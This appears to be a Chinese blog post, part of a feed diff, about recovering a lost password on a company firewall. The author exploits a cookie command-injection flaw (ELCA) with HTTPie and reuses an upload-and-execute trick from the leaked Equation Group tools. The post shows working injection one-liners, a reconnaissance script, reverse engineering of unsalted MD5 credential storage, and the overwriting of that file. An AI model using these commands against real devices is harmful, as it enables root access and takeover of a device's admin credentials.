+<p>怀着激动的心情，尝试了 <code>ls -la /&gt;/www/htdocs/1</code>、 <code>find / -type f&gt;/www/htdocs/1</code> 等指令，对防火墙文件系统的目录结构进行初步了解，也看到了配置文件存放的位置。执行 <code>cp /XXX/conf/config&gt;/www/htdocs/1</code>，把配置文件down下来一看，果然是新鲜的味道。</p>
+<p>启动telnetd服务并尝试连接，报错，估计是没有加特定启动参数的缘故，没做深入研究。看来暂时还是只能通过https漏洞方式跑命令了。</p>
+<p>随着执行命令次数越来越多，Brup构造请求的方式效率太低，于是写了简单的Python函数在IPython下面跑，终觉得灵活性不够。最后决定采用HTTPie命令行的方式发送https请求（curl没有httpie方便），后续所有命令都通过这种方式交互。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ http --verify=no https://x.x.x.x/cgi/maincgi.cgi &apos;Cookie: session_id=x`ls -la /tmp&gt;/www/htdocs/1`&apos;</div></pre></td></tr></table></figure>
+<h3 id="文件上传，执行脚本文件"><a href="#文件上传，执行脚本文件" class="headerlink" title="文件上传，执行脚本文件"></a>文件上传，执行脚本文件</h3><p>之前都是一次请求执行一条命令，效率太低，也存在诸多限制。最好的方式是上传一个sh脚本在防火墙上执行，这就需要以某种方式传送文件到防火墙上去。</p>
+<p>另一方面，根据漏洞名称和Equation Group搜索到这篇文章：<a href="http://www.freebuf.com/special/112272.html" target="_blank" rel="external">Equation Group泄露文件分析</a>，才注意到这是国际顶尖黑客组织，也是NSA合作的方程式黑客组织（Equation Group），被另一个名为“The ShadowBrokers”的黑客组织攻下了，珍藏的系列高级工具被打包分享。这可是个好东西！赶紧下载解密，找到ELCA的漏洞利用代码，运行后却发现没有如逾期般的启动nopen远程管理软件，原因未知，颇有些失望。不过在py源码中看到了文件上传的方式，其实就是利用了cgi文件上传处理方式，它每次会在/tmp目录下生成一个cgi*的临时文件。ELCA利用代码的流程是连续执行多次指令，第一次 <code>rm /tmp/cgi*</code>清理tmp目录，接着post上传文件同时复制保存一份 <code>cp /t*/cg* /tmp/.a</code>，再加执行权限 <code>chmod +x /tmp/.a</code>，最后执行 <code>/tmp/.a</code>。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/upload_run.png" alt="upload_run.png"></p>
+<p>当然，代码并没有直接上传一个可执行文件，而是巧妙（恕见识少，我知道*nix下经常这样干）的将需要的多个文件用tar打包后，附到sh脚本的最后。在sh脚本中用dd命令将tar包copy出来再解压运行。下面是工具中stage.sh的部分代码：</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/stager.png" alt="stager.jpg"></p>
+<p>文件tar打包的Python代码片段：</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/build_exploit_payload.png" alt="build_exploit_payload.png"></p>
+<p>就我的需求而言，只是上传脚本执行，就不用做得那么复杂了。简单的post我的sh脚本，同时执行 <code>sh /tmp/cgi*</code>。前提是我的sh脚本中都做了清理工作 <code>rm /tmp/cgi*</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http --verify=no -b -f POST https://x.x.x.x/cgi/maincgi.cgi &apos;Cookie: session_id=x`sh /t*/cg*`&apos; a@test.sh; http --verify=no https://x.x.x.x/1</div></pre></td></tr></table></figure>
+<p>HTTPie可以用 <code>uploadfilename@localfilename</code> 的方式很方便的实现文件上传。之所以两条指令在一行是为了方便查看前一个脚本的输出。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="comment"># 清除/tmp/cgi*，防止干扰下次运行</span></div><div class="line">rm <span class="_">-f</span> /t*/cgi*</div><div class="line"></div><div class="line"><span class="built_in">echo</span> =============================== &gt;/www/htdocs/1</div><div class="line">date &gt;&gt;/www/htdocs/1</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"***************"</span> &gt;&gt;/www/htdocs/1</div><div class="line"><span class="built_in">cd</span> /tmp</div><div class="line">ps &gt;&gt;/www/htdocs/1</div><div class="line">netstat -nltp &gt;&gt;/www/htdocs/1</div><div class="line">ls -la /xxx/etc /data/auth/db /tmp &gt;&gt;/www/htdocs/1</div></pre></td></tr></table></figure>
+<p>上面的示例脚本就可以一次进行多种操作，获取进程信息、网络连接情况、目录文件等多种信息，大幅减少交互次数提高效率。</p>
+<h3 id="逆向分析，寻找密码"><a href="#逆向分析，寻找密码" class="headerlink" title="逆向分析，寻找密码"></a>逆向分析，寻找密码</h3><p>做了很多准备工作，找到了比较便捷的脚本执行方式。而且根据ps结果来看，指令是以root权限运行的。接下来要开始干正事了，<code>tar cf /home/htdocs/1 /</code> 打包文件系统，down下来准备逆向分析。因为web登录入口指向maincgi.cgi，就从它开始。</p>
+<p>逆向分析的过程相当繁杂、漫长、枯燥乏味，具有相当的挑战性，所以需要坚定的毅力和不时涌现的灵感。无数次调整思路和方向，无数次寻找新的突破口。</p>
+<p>我现在也记不清当初分析时的前因后果，就把一些分析的结果整理下，做一个简单的分享。</p>
+<h4 id="入口-maincgi-cgi"><a href="#入口-maincgi-cgi" class="headerlink" title="入口 maincgi.cgi"></a>入口 maincgi.cgi</h4><p><code>maincgi.cgi</code> 位于 <code>/www/cgi/</code> 目录下。用IDA进行逆向分析。</p>
+<p>根据登录form提交的 <code>username</code> 和 <code>passwd</code> 在string窗口搜索，x跟踪调用情况分析，最终来到 000403D4 函数内。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/maincgi_403D4.png" alt="maincgi_403D4.png"></p>
+<p>下面是更容易理解的C伪代码（我开始分析的时候没找到可用的hexrays，这是事后撰写此文时找到的。:-(  工欲善其事必先利其器啊！）：</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/maincgi_403D4_c_m.png" alt="maincgi_403D4_c.png"></p>
+<p>可以看到，username和passwd参数都原封不动的传入到login函数，想必沿着这个方向一定能找到密码保存的地方。</p>
+<p>跟进发现login是import函数，不在maincgi.cgi中实现。为了方便，我把lib和so目录下所有文件的符号表都进行了分析，结果保存在一个文件中备查。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nm -D xxx/lib/* xxx/so/* &gt; symbols.txt</div></pre></td></tr></table></figure>
+<p>很快发现 <code>login</code> 函数在 /xxx/so/libwebui_tools.so 中实现。</p>
+<h4 id="入了RPC的坑"><a href="#入了RPC的坑" class="headerlink" title="入了RPC的坑"></a>入了RPC的坑</h4><p>本以为找到 libwebui_tools.so 中的login实现，一切皆可水落石出。谁料还是 <em>too young, too naive</em>。</p>
+<p>根据export表很快定位到login函数的实现，开始是TLS连接127.0.0.1：4000，接着是一堆错误处理代码。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/login_m.png" alt="login.png"></p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/login_4000_m.png" alt="login_4000.png"></p>
+<p>其中有一个 <code>gui_send_reqx</code> 函数的调用参数 <code>CFG_AUTH</code> 引起了我的注意，猜测是一种自定义的类RPC实现。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/login_cfg_auth.png" alt="login_cfg_auth.png"></p>
+<p>唉，还是C伪代码看得清楚啊！再次哭晕在厕所 :-(</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/login_c_m.png" alt="login_c.png"></p>
+<p>既然不是通过本地.so调用，那只有知道到底是谁提供了这个rpc服务，才能找到接下来的路。</p>
+<h4 id="好用的netstat"><a href="#好用的netstat" class="headerlink" title="好用的netstat"></a>好用的netstat</h4><p>好在我们有执行代码的权限，好在防火墙里面有netstat命令。执行 <code>netstat -nltp &gt;&gt;/www/htdocs/1</code> 得到下面的结果：</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/netstat_m.png" alt="netstat.png"></p>
+<p>一目了然。原来服务是 <code>xxx_configd</code> 提供的呀！被ELCA漏洞利用脚本误导了，以为是只是一个命令行shell，之前跟过，但没有细看。这不，还是要回头找它。</p>
+<h4 id="百转千回"><a href="#百转千回" class="headerlink" title="百转千回"></a>百转千回</h4><p>xxx_configd 分析过程并非一帆风顺。</p>
+<p>根据RPC传递的参数CFG_AUTH作为线索进行追踪，看到RPC支持多个命令。当命令为CFG_AUTH时，将数字5写到参数传入的内存区域某个变量中。没有其他更多的信息，看来只能根据caller向上一步步追了。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/tos_configd_cfg_auth.png" alt="xxx_configd_cfg_auth.png"></p>
+<p>代码回到rpc的消息处理thread中，经过逐步分析，定位到消息处理函数中。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/tos_configd_rpchandle.png" alt="xxx_configd_rpchandle.png"></p>
+<p>跟进去，可以看到大致的处理流程。有一个switch过程，case 5后面就是CFG_AUTH的处理代码。5就是前面第一个过程中设置的变量。xxx_manager_auth函数用于接管用户密码鉴权工作，它是一个import函数，按照前面的方法查到它在 /xxx/so/libmanager.so 中实现。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/xxx_configd_rpchandlelogin_m.png" alt="xxx_configd_rpchandlelogin.png"></p>
+<h4 id="胜利的曙光"><a href="#胜利的曙光" class="headerlink" title="胜利的曙光"></a>胜利的曙光</h4><p>libmanager的export表非常简练，似乎每一个都让人颇感兴趣。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_export_m.png" alt="libmanager_export.png"></p>
+<p>先看看我们的目标函数xxx_manager_auth：</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_auth_m.png" alt="libmanager_auth.png"></p>
+<p>信息量很大，到这里基本上就看到了胜利的曙光。</p>
+<p>首先看到的是用户名+密码的MD5，然后传入到 j_match_manager_name 函数中进行校验。这不就是经典的用户名密码校验过程嘛（未加salt）。</p>
+<p>需要说明一下的是，上图中看到的username参数名称是我综合各类分析得知内容后改名的，并不是想当然，更不是IDA智能更名。username+32是密码明文，这也是在前面的分析过程中得出的结论。</p>
+<p>跟进match_manager_name函数，并没有立即发现直观的密码文件读取过程。取而代之的是，内存中存在最多500个struct，其中包含了用户名和MD5值，鉴权过程就是与其一一进行匹配比对。Local_db_dev_node是一个全局buffer，搞清楚它的数据来源就找到根源了。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_match_manager_name.png" alt="libmanager_match_manager_name.png"></p>
+<p>按X查看Local_db_dev_node的reference，还真不少。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_xref_m.png" alt="libmanager_xref.png"></p>
+<p>第一个read_dev_manager_file就很像，跟进去看一下。</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_read_dev_manager_file_m.png" alt="libmanager_read_dev_manager_file.png"></p>
+<p>Bingo！就是它了！ <code>/xxx/etc/xxx_dev_manager_info</code> 其实这个文件之前也注意到，不过没曾想它居然保存了鉴权信息，而且是用户名密码拼接MD5这么简单！</p>
+<p>用hexdump查看之前下载的xxx_dev_manager_info进行验证，大小104字节，与分析得到的struct大小完全一致。再看用户名和密码的位置，和分析Local_db_dev_node结构完全一致。</p>
+<h4 id="清除最后的障碍"><a href="#清除最后的障碍" class="headerlink" title="清除最后的障碍"></a>清除最后的障碍</h4><p>终于找到密码保存到文件了，三下五除二，自己设定一个密码，计算MD5值，修改xxx_dev_manager_info对应的区域。文件上传，覆盖，重启，等结果……</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">print(hashlib.md5(<span class="string">'********'</span> + <span class="string">'111111'</span>).hexdigest())</div></pre></td></tr></table></figure>
+<p>几分钟后，设备起来了，赶紧试一下密码，错误！！！</p>
+<p>郁闷，怎么会呢？down下/xxx/etc/xxx_dev_manager_info一看，还是老数据。看来是工作还没到位。</p>
+<p>想起 libmanager 不是有那么多可疑的函数吗？挑感兴趣的进去看看，比如write_memdata2flash：</p>
+<p><img src="http://ofcdyjn8r.bkt.clouddn.com/blog-protf/libmanager_write_memdata2flash_m.png" alt="libmanager_write_memdata2flash.png"></p>
+<p>对，就它了。一般网络设备修改配置以后，不都还来一个 <code>wr mem</code> 吗？估计 /data/auth/db/ 才是最终保存数据的地方，/xxx/etc可能重启的时候会重新copy覆盖。</p>
+<p>再重新上传一次修改好的xxx_dev_manager_info文件，只不过这次同时覆盖了几个目录下的文件。重启，用设定的密码登录，搞定！！！</p>
+<h4 id="走过的弯路"><a href="#走过的弯路" class="headerlink" title="走过的弯路"></a>走过的弯路</h4><p>当然，我分析过的文件远不止上面这些，也不是按照本文的思路一步一步走下来，走了不少弯路。凭感觉，或为了寻找新线索，或漫无目的地毯式搜索。除了上面列举的部分之外，还分析过其他几个.so文件，跟踪过上百个函数，多数与我需要的东西关系并不太大。</p>
+<p>逆向分析就是这样，不可能一帆风顺，也没有既定的方法和思路。就是要有一种执着的精神，在不断的尝试、纠错和总结过程中达到目的地。成功后那一刻豁然开朗的成就感一直是我所痴迷的。</p>
+<h3 id="关于MD5破解不得不说的事"><a href="#关于MD5破解不得不说的事" class="headerlink" title="关于MD5破解不得不说的事"></a>关于MD5破解不得不说的事</h3><p>既然知道了算法，也有了MD5数据，是不是可以真正的找回当初的密码呢？</p>
+<p>和第一步猜测密码类似，用python按照一定规则，生成可能的密码序列。调用 <code>hashlib.md5()</code> 计算hash值与目标进行比对，结果跑了一天没结果。</p>
+<p>想着这种计算密集型的程序，在python和c之间切换太频繁可能影响效率。又在网上找到一个 <a href="https://www.nayuki.io/page/fast-md5-hash-implementation-in-x86-assembly" target="_blank" rel="external">Fast MD5 hash implementation in x86 assembly</a> 汇编实现的快速算法，并且根据实际需求做了一定的优化。运行，依然无结果。</p>
+<p>不甘心，再到网上搜索资料，发现人家都用GPU跑字典。好吧，我也找来一个 <a href="http://hashcat.net/hashcat/" target="_blank" rel="external">Hashcat</a>，在 i5 8G内存 的iMac 上试跑，的确速度非常快。然而，由于密码长，计算量过大，最终也没跑出结果，就此作罢。</p>
+<p>现在想想，如果没有密码长度、规则等任何信息的话，光凭暴力破解一个非典型密码，几乎是 Mission Impossible。</p>
+<h3 id="搞定，收工"><a href="#搞定，收工" class="headerlink" title="搞定，收工"></a>搞定，收工</h3><p>很久没写过长文，也没发过技术类文章。上一次可能要追溯到2001年8月的时候，曾以打鸡血似的饱满激情写过一篇<a href="http://www.pediy.com/kssd/tutorial/chap6-1-41.htm" target="_blank" rel="external">软件逆向习作</a>。</p>
+<p>此次防火墙密码成功恢复，其漏洞功不可没。对我而言，又重温了一把当初年少时对技术的执着。</p>
+<p>最后，小结一下：</p>
+<ul>
+<li>软件逆向分析是个体力活。</li>
+<li>工欲善其事必先利其器。</li>
+<li>安全问题无时无刻不在。</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;公司在用的一款防火墙，密码意外遗失，无法登陆管理平台。虽然防火墙可以正常工作，但却无法修改配置，不能根增加和删除访问列表中的IP地址，不能调整访问策略。防火墙默认仅开通https web管理界面，未开启telnet、ssh等其他管理通道。&lt;/p&gt;
+&lt;p&gt;联系厂家寻求技术支持
+    
+    </summary>
+    
+      <category term="逆向分析" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="防火墙" scheme="http://yoursite.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
+    
+      <category term="密码恢复" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E6%81%A2%E5%A4%8D/"/>
+    
+      <category term="天融信" scheme="http://yoursite.com/tags/%E5%A4%A9%E8%9E%8D%E4%BF%A1/"/>
+    
+      <category term="逆向分析" scheme="http://yoursite.com/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
+    
+      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+</feed>
